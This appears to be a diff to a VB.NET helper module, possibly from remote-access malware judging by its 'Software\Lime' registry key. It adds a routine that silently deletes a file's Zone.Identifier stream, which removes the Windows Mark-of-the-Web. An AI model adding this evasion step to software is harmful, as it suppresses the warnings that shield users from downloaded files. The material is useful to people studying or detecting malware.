@@ -14,7 +14,7 @@ Module S_Functions
         Try
             Return Registry.CurrentUser.CreateSubKey("Software\" & "Lime").GetValue(n, "")
         Catch ex As Exception
-            Return ""
+            Return Nothing
         End Try
     End Function
 
@@ -147,5 +147,12 @@ Module S_Functions
         End If
     End Function
 
+    <Runtime.InteropServices.DllImport("kernel32.dll", CharSet:=Runtime.InteropServices.CharSet.Auto, BestFitMapping:=False, ThrowOnUnmappableChar:=True, SetLastError:=True)>
+    Function DeleteFile(<Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.LPTStr)> ByVal filepath As String
+    ) As <Runtime.InteropServices.MarshalAs(Runtime.InteropServices.UnmanagedType.Bool)> Boolean
+    End Function
+    Sub DeleteZoneIdentifier(ByVal filePath As String)
+        Try : DeleteFile(filePath + ":Zone.Identifier") : Catch : End Try
+    End Sub
 
 End Module
